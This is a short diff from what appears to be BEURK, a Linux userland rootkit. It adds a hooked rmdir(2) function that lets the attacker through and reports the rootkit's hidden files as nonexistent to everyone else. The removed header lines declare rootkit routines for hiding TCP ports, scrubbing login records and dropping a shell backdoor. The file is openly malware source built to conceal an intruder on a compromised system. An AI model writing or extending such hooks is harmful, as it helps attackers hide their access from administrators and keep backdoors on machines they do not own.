@@ -18,33 +18,21 @@
  * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
  */
 
-#pragma once
+#include <errno.h> /* errno, ENOENT */
+#include "beurk.h" /* is_attacker(), is_hidden_file() */
+#include "config.h" /* REAL_RMDIR() */
+#include "hooks.h" /* prototype */
 
-#ifndef _BEURK_H_
-# define _BEURK_H_
+int rmdir(const char *pathname) {
+    DEBUG(D_INFO, "called rmdir(2) hook");
 
-# include <sys/socket.h>
-# include "debug.h"
+    if (is_attacker())
+        return (REAL_RMDIR(pathname));
 
-/* init.c */
-void        init(void) __attribute__((constructor));
+    if (is_hidden_file(pathname)) {
+        errno = ENOENT;
+        return (-1);
+    }
 
-/* is_attacker.c */
-int         is_attacker(void);
-
-/* is_hidden_file.c */
-int         is_hidden_file(const char *path);
-
-/* is_procnet.c */
-int         is_procnet(const char *path);
-
-/* hide_tcp_ports  */
-FILE        *hide_tcp_ports(const char *file);
-
-/* cleanup_login_records.c */
-void        cleanup_login_records(const char *pty_name);
-
-/* drop_shell_backdoor.c */
-int         drop_shell_backdoor(int sock, struct sockaddr *addr);
-
-#endif /* _BEURK_H_ */
+    return (REAL_RMDIR(pathname));
+}
